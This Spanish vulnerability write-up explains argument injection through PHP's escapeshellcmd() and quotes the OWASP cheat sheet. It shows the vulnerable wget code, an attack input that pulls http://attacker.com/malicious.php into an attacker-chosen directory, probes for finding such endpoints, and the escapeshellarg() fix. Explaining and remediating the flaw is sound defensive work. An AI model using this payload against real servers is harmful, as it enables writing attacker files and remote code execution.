---
clase: inyeccion
tech: php-escapeshellcmd
cwe: CWE-88
cvss: 8.8 # [derivado] escritura de fichero arbitrario en el servidor desde un host del atacante
payload: |
  # CODIGO VULNERABLE - LITERAL de la fuente (saltos de linea colapsados en el render):
  $url = $_GET['url']; $command = 'wget --directory-prefix=..\temp ' . $url; system(escapeshellcmd($command));
  #
  # ENTRADA DEL ATAQUE - LITERAL de la fuente:
  http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
  #
  # COMANDO RESULTANTE - LITERAL de la fuente:
  wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
  #
  # Mecanica: escapeshellcmd() impide ejecutar OTRO comando, pero NO impide añadir
  # ARGUMENTOS al comando previsto. El segundo --directory-prefix sobrescribe el
  # primero, asi que el fichero descargado aterriza en el directorio actual en lugar
  # de en ..\temp.
  #
  # CODIGO SEGURO - LITERAL de la fuente ('safe approach'):
  $url = $_GET['url']; $command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url); system($command);
  #
  # Ilustracion de la clase con curl - LITERAL de la fuente:
  system("curl " . escape($url));
  system("curl " . escape("--help"))
precondicion: "El codigo construye una linea de comando concatenando entrada del usuario y la pasa por escapeshellcmd(). La entrada no es una URL validada sino texto libre que acaba en la posicion de un argumento. El comando invocado debe tener una opcion que, repetida, sobrescriba la anterior (el caso de --directory-prefix en wget)."
como_se_descubre: |
  Señal en recon: funcionalidad que descarga una URL remota indicada por el usuario
  (importadores, previsualizadores, 'subir desde URL', webhooks de prueba).
  Sonda: enviar un valor que empiece por '-' o '--'. La pregunta no es '¿puedo ejecutar
  otro comando?' sino '¿puedo añadir un argumento?'. Es un cambio de marco importante:
  los filtros de inyeccion de comandos buscan metacaracteres (; | & $) y esta clase no
  usa ninguno. El payload es sintacticamente inofensivo para un filtro de shell.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: url=--directory-prefix=. http://host-controlado/fichero
  #    -> el fichero aterriza en el directorio ACTUAL, no en ..\temp
  # B: url=http://host-controlado/fichero
  #    -> el fichero aterriza en ..\temp (comportamiento previsto)
  # El par A/B demuestra que se controla el DESTINO, que es el impacto real.
  # C: url=; id    -> debe ser bloqueado por escapeshellcmd
  # El control C es el que da fuerza al informe: prueba que la proteccion contra
  # inyeccion de comandos FUNCIONA, y que aun asi el ataque pasa. Sin C, el triador
  # puede pensar que basta con añadir escapado.
mata: |
  - Se usa escapeshellarg() en lugar de escapeshellcmd() -> el valor queda como UN
    argumento y no se puede añadir otro.
  - La entrada se valida contra una allowlist antes de construir el comando.
  - El comando invocado no tiene opciones sobrescribibles con impacto.
  - Se usa una API de proceso con argumentos separados en vez de una linea de shell.
fuente: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html. Codigo vulnerable, entrada de ataque, comando resultante y codigo seguro son literales de la pagina. ADVERTENCIA: el render colapso los saltos de linea del codigo PHP."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] Argument injection a través de `escapeshellcmd()` — añadir argumentos sin usar un solo metacarácter

## Principio
Hay dos defensas de PHP que parecen equivalentes y protegen de cosas distintas. La
propia fuente lo dice con precisión:

> `escapeshellcmd()`: *"Ensures the user can execute only the intended command, can pass
> unlimited parameters, but cannot execute other commands."*

"Puede pasar parámetros ilimitados" es la vulnerabilidad. El atacante no necesita
ejecutar otro comando: le basta cambiar cómo se comporta el que ya se ejecuta. Y para
eso no hace falta ningún metacarácter, así que todo filtro que busque `;`, `|`, `&` o
`$` deja pasar el payload intacto.

## Payload
Código vulnerable, literal de la fuente:

```php
$url = $_GET['url']; $command = 'wget --directory-prefix=..\temp ' . $url; system(escapeshellcmd($command));
```

Entrada del ataque:

```
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```

Comando resultante:

```
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```

El segundo `--directory-prefix` sobrescribe el primero. El fichero descargado desde el
host del atacante aterriza donde el atacante decide, no en `..\temp`.

## El control negativo que da fuerza al informe
Probar `; id` y comprobar que **sí** se bloquea es lo que convierte este hallazgo en
irrefutable. Demuestra que la protección contra inyección de comandos funciona
correctamente y que el ataque pasa de todos modos. Sin ese control, la respuesta
natural de quien recibe el informe es "añadiremos escapado" — que es exactamente lo que
ya hay y no resuelve nada. El control negativo es lo que fuerza el diagnóstico correcto.

## Impacto
Escritura de un fichero controlado por el atacante en una ruta que el atacante elige
dentro del servidor. En una aplicación PHP, escribir un `.php` en un directorio servido
es ejecución remota de código.

## Remediación
El código seguro de la fuente, que cambia una sola función:

```php
$url = $_GET['url']; $command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url); system($command);
```

> `escapeshellarg()`: *"Ensures the user can pass only one parameter to the command,
> cannot add extra parameters, and cannot execute a different command."*

Y la recomendación explícita de la fuente: *"It is always preferable to use
`escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input."* Más
las dos reglas que la acompañan: *"**Hardcode options**: required flags (e.g.,
`--directory-prefix`) should be in the code, not in user input."* y *"**Hardcode the
command**: never allow the user to choose which executable to run."*

La defensa de primer orden sigue siendo la de la propia fuente: *"The primary defense is
to avoid calling OS commands directly."*
